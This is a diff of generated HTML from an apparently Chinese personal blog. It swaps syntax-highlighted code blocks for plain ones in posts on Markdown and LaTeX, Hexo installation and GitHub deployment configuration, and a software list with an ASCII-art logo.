 <p><strong>Markdown</strong> 是一种 <a href="https://zh.wikipedia.org/wiki/%E8%BD%BB%E9%87%8F%E7%BA%A7%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80" title="轻量级标记语言">轻量级标记语言</a>，创始人为 <a href="https://zh.wikipedia.org/wiki/%E7%B4%84%E7%BF%B0%C2%B7%E6%A0%BC%E9%AD%AF%E4%BC%AF" title="约翰·格鲁伯">约翰·格鲁伯</a>（英语：John Gruber）。它允许人们“使用易读易写的纯文本格式编写文档，然后转换成有效的 <a href="https://zh.wikipedia.org/wiki/XHTML" title="XHTML">XHTML</a>（或者 <a href="https://zh.wikipedia.org/wiki/HTML" title="HTML">HTML</a>）文档”。<a href="https://zh.wikipedia.org/wiki/Markdown#cite_note-md-4">[4]</a> 这种语言吸收了很多在 <a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6" title="电子邮件">电子邮件</a> 中已有的纯文本标记的特性。</p>
@@ -1925,9 +1974,10 @@ Isn<span style="color:#e6db74">&#39;t it a terrible day?$
 <p><code>$</code> 表示行内公式：</p>
 <p>质能守恒方程 $E=mc^2$ 可以写作 <code>$E=mc^2$</code>。</p>
 <p><code>$$</code> 表示整行公式，如</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-latex" data-lang="latex"><span style="color:#e6db74">$$</span>\sum_{i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>}^n a_i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">$$</span>
-<span style="color:#e6db74">$$</span>f<span style="color:#f92672">(</span>x_<span style="color:#ae81ff">1</span>,x_x,\ldots,x_n<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> x_<span style="color:#ae81ff">1</span>^<span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> x_<span style="color:#ae81ff">2</span>^<span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> \cdots <span style="color:#f92672">+</span> x_n^<span style="color:#ae81ff">2</span> <span style="color:#e6db74">$$</span>
-</code></pre></div><p>会被渲染为</p>
+<pre><code class="language-latex">$$\sum_{i=1}^n a_i=0$$
+$$f(x_1,x_x,\ldots,x_n) = x_1^2 + x_2^2 + \cdots + x_n^2 $$
+</code></pre>
+<p>会被渲染为</p>
 <p>$$\sum_{i=1}^n a_i=0$$</p>
 <p>$$f(x_1,x_x,\ldots,x_n) = x_1^2 + x_2^2 + \cdots + x_n^2 $$</p>
 <h2 id="与-word-的不同">与 Word 的不同</h2>
@@ -2043,10 +2093,11 @@ RSS 是什么在此不再赘述。那么，为何支持 RSS 是一种美德呢�
 下面按照hexo官方文档执行<code>npm install -g hexo-cli</code>。
 <strong>*unix下请使用<code>root</code>权限执行，否则会出现错误。</strong>
 而后执行</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hexo init &lt;folder&gt;
+<pre><code class="language-bash">hexo init &lt;folder&gt;
 cd &lt;folder&gt;
 npm install
-</code></pre></div><p><code>&lt;folder&gt;</code>为文件夹的名字，可以随意。
+</code></pre>
+<p><code>&lt;folder&gt;</code>为文件夹的名字，可以随意。
 接下来请<code>npm install hexo-deployer-git --save</code>，这是用于向Github部署用的插件。</p>
 <h2 id="配置">配置</h2>
 <p>这里主要是对<code>_config.yml</code>的更改</p>
@@ -2057,11 +2108,12 @@ npm install
 <li>由于我们使用的是GitHub的服务，因此<code>url</code>项应该是<code>https://username.github.io</code>，<code>username</code>是你自己的GitHub用户名，需要注意的是<strong><code>https</code></strong>。</li>
 <li><code>deploy</code>项应形如</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#66d9ef">deploy</span>:
-  <span style="color:#66d9ef">type</span>: git
-  <span style="color:#66d9ef">repo</span>: &lt;git-source<span style="color:#e6db74">&gt;
-</span><span style="color:#e6db74">  branch: master</span>
-</code></pre></div><ul>
+<pre><code class="language-yml">deploy:
+  type: git
+  repo: &lt;git-source&gt;
+  branch: master
+</code></pre>
+<ul>
 <li><code>repo</code>项可以用ssh或者https，视个人情况而定</li>
 </ul>
 <h2 id="更多">更多</h2>
@@ -2306,25 +2358,26 @@ telegram的第三方客户端，1520上在用，电脑上没怎么用</p>
 <h2 id="编程相关">编程相关</h2>
 <h3 id="open-wsl">open-wsl</h3>
 <p>用来代替自带的ubuntu终端~</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">                           ./+o+-
+<pre><code class="language-bash">                           ./+o+-
                    yyyyy- -yyyyyy+
                 ://+//////-yyyyyyo
-            .++ .:/++++++/-.+sss/<span style="color:#e6db74">`</span>
+            .++ .:/++++++/-.+sss/`
           .:++o:  /++++++++/:--:/-
-         o:+o+:++.<span style="color:#e6db74">`</span>..<span style="color:#e6db74">```</span>.-/oo+++++/
-        .:+o:+o/.          <span style="color:#e6db74">`</span>+sssoo+/
-   .++/+:+oo+o:<span style="color:#e6db74">`</span>             /sssooo.
-  /+++//+:<span style="color:#e6db74">`</span>oo+o               /::--:.
-  <span style="color:#ae81ff">\+</span>/+o+++<span style="color:#e6db74">`</span>o++o               ++////.
-   .++.o+++oo+:<span style="color:#e6db74">`</span>             /dddhhh.
-        .+.o+oo:.          <span style="color:#e6db74">`</span>oddhhhh+
-         <span style="color:#ae81ff">\+</span>.++o+o<span style="color:#e6db74">``</span>-<span style="color:#e6db74">````</span>.:ohdhhhhh+
-          <span style="color:#e6db74">`</span>:o+++ <span style="color:#e6db74">`</span>ohhhhhhhhyo++os:
-            .o:<span style="color:#e6db74">`</span>.syhhhhhhh/.oo++o<span style="color:#e6db74">`</span>
+         o:+o+:++.`..```.-/oo+++++/
+        .:+o:+o/.          `+sssoo+/
+   .++/+:+oo+o:`             /sssooo.
+  /+++//+:`oo+o               /::--:.
+  \+/+o+++`o++o               ++////.
+   .++.o+++oo+:`             /dddhhh.
+        .+.o+oo:.          `oddhhhh+
+         \+.++o+o``-````.:ohdhhhhh+
+          `:o+++ `ohhhhhhhhyo++os:
+            .o:`.syhhhhhhh/.oo++o`
                 /osyyyyyyo++ooo+++/
-                    <span style="color:#e6db74">`````</span> +oo+++o<span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>                           <span style="color:#e6db74">`</span>oo++.
-</code></pre></div><h3 id="git">Git</h3>
+                    ````` +oo+++o\
+                           `oo++.
+</code></pre>
+<h3 id="git">Git</h3>
 <p>版本控制~</p>
 <h3 id="sourcetree">SourceTree</h3>
 <p>一个Git的GUI客户端，比GitHub Desktop功能更加强大</p>
